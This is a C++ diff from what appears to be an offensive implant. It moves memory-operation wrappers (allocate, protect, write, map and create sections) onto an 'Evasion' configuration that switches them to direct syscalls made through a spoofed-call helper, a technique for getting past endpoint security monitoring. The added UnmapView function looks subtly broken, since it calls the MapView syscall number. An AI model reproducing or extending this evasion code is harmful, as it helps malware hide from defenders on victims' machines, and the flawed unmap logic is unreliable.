@@ -7,7 +7,7 @@ auto DECLFN Memory::Read(
     _Out_ PSIZE_T Reads,
     _In_  HANDLE  Handle
 ) -> BOOL {
-    const UINT32 Flags = Self->Config.Syscall;
+    const UINT32 Flags = Self->Config.Evasion.Syscall;
     NTSTATUS    Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Flags ) {
@@ -36,7 +36,7 @@ auto DECLFN Memory::Alloc(
     _In_  ULONG   Protect,
     _In_  HANDLE  Handle
 ) -> PVOID {
-    UINT32 Flags = Self->Config.Syscall;
+    UINT32 Flags = Self->Config.Evasion.Syscall;
 
     NTSTATUS Status      = STATUS_UNSUCCESSFUL;
     PVOID    BaseAddress = Base;
@@ -75,7 +75,7 @@ auto DECLFN Memory::Protect(
     _Out_ ULONG  *OldProt,
     _In_  HANDLE  Handle
 ) -> BOOL {
-    const UINT32 Flags  = Self->Config.Syscall;
+    const UINT32 Flags  = Self->Config.Evasion.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Flags ) {
@@ -106,7 +106,7 @@ auto DECLFN Memory::Write(
     _Out_ SIZE_T* Written,
     _In_  HANDLE  Handle
 ) -> BOOL {
-    const UINT32 Flags   = Self->Config.Syscall;
+    const UINT32 Flags   = Self->Config.Evasion.Syscall;
     NTSTATUS     Status  = STATUS_UNSUCCESSFUL;
 
     if ( ! Flags ) {
@@ -134,7 +134,7 @@ auto DECLFN Memory::Free(
     _In_ ULONG  FreeType,
     _In_ HANDLE Handle
 ) -> BOOL {
-    const UINT32 Flags  = Self->Config.Syscall;
+    const UINT32 Flags  = Self->Config.Evasion.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Flags ) {
@@ -167,7 +167,7 @@ auto DECLFN Memory::MapView(
     _In_        ULONG           AllocationType,
     _In_        ULONG           PageProtection
 ) -> NTSTATUS {
-    const UINT32 Flags = Self->Config.Syscall;
+    const UINT32 Flags = Self->Config.Evasion.Syscall;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Flags ) {
@@ -191,6 +191,24 @@ auto DECLFN Memory::MapView(
     return Status;
 }
 
+auto DECLFN Memory::UnmapView(
+    _In_     HANDLE ProcessHandle,
+    _In_opt_ PVOID  BaseAddress
+) -> LONG {
+    UINT32   Flags  = Self->Config.Evasion.Syscall;
+
+    if ( ! Flags ) {
+        return Self->Ntdll.NtUnmapViewOfSection( ProcessHandle, BaseAddress );
+    }
+
+    UPTR Address = SYS_ADDR( Sys::MapView );
+    UPTR ssn = SYS_SSN( Sys::MapView );
+
+    return Self->Spf->Call(
+        Address, ssn, (UPTR)ProcessHandle, (UPTR)BaseAddress
+    );
+}
+
 auto DECLFN Memory::CreateSection(
     _Out_    PHANDLE           SectionHandle,
     _In_     ACCESS_MASK       DesiredAccess,
@@ -200,7 +218,7 @@ auto DECLFN Memory::CreateSection(
     _In_     ULONG             AllocationAttributes,
     _In_opt_ HANDLE            FileHandle
 ) -> NTSTATUS {
-    const UINT32 Flags = Self->Config.Syscall;
+    const UINT32 Flags = Self->Config.Evasion.Syscall;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Flags ) {
@@ -211,8 +229,8 @@ auto DECLFN Memory::CreateSection(
         );
     }
 
-    UPTR Address = SYS_ADDR( Sys::CrSectn );
-    UPTR ssn = SYS_SSN( Sys::CrSectn );
+    UPTR Address = SYS_ADDR( Sys::CreateSection );
+    UPTR ssn = SYS_SSN( Sys::CreateSection );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)SectionHandle, (UPTR)DesiredAccess,
